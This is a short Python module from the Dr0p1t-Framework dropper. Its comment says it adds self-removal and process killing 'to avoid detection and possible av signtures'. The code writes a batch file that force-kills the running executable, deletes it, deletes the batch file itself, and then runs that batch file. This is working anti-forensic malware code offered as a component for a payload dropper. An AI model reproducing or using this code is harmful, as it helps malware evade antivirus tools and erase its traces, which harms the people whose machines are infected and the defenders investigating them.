#Written by: Karim shoair - D4Vinci ( Dr0p1t-Framework )
#This script aims to add the ability of the self-remove and kill to the dropper to avoid detection and possible av signtures
#Start

def selfdestruct():
    from sys import executable
    filename = executable.split("\\")[-1]
    data = '''@echo off
    TASKKILL /F /IM "{}"
    DEL -f "{}"
    DEL "%~f0"'''.format( filename,filename )
    f = open("nothing.bat","w")
    f.write(data)
    f.close()
    xxx = subprocess.Popen("nothing.bat > NUL",shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)

selfdestruct()
